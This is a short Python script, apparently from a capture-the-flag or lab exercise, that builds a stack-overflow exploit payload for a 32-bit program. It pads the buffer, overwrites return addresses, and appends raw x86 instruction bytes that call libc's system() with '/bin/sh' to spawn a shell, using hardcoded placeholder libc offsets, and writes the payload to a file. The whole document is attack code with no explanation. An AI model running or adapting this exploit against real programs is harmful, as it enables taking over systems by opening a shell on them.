import struct

# Assume these values are found through your analysis

offset = 0x6c
libc_base_addr = 0xb7d47000
system_offset = 0x0003f060
bin_sh_offset = 0x160c58
base_addr = 0x0804a078
addr_inter = base_addr + 0x4
addr_shellcode = base_addr + 0x08

# Create the payload

payload = b"A" * offset
payload += struct.pack("<I", addr_inter)
payload += struct.pack("<I", addr_shellcode)
payload += b"\xC7\x04\x24"  # mov_dword
payload += struct.pack("<I", libc_base_addr + bin_sh_offset)
payload += b"\xe8"          # call
payload += struct.pack("<I", libc_base_addr + system_offset - 0x0804a08c) # current address for relative call


# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)

